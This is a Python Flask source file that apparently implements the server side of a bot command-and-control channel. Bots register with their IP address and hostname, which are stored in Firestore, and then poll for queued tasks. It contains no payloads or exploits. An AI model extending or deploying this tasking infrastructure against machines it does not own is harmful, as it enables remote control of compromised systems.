from flask import Flask, request, Blueprint
from flask_socketio import SocketIO

import firebase_admin
from firebase_admin import credentials, firestore

import uuid

from . import routes

client_api = Blueprint('client_api', __name__)

# Firestore/Firebase Stuff
cred = credentials.Certificate("serviceAccountKey.json")
firebase_admin.initialize_app(cred)
db = firestore.client()

@routes.route('/bot/register/<string:hostname>', methods=['POST'])
def index(hostname):
    id = str(uuid.uuid4())

    db.collection('machines').add({
        'uuid': id,
        'ip': request.remote_addr,
        'hostname': hostname,
        'poll_rate': 5,
        'tasks': [],
    })

    return {'uuid': id}


@routes.route('/bot/poll', methods=['GET'])
def poll():
    machines = db.collection('machines').where(
        'uuid', '==', request.headers.get('uuid')).limit(1).get()

    if not machines:
        return {'Error': 'No machines found'}

    machine = machines[0]
    tasks = machine.to_dict()['tasks']

    if tasks:
        task = tasks.pop(0)
        machine.reference.update({'tasks': tasks})
        return {'task': task}

    return ({'task': None}, 418)
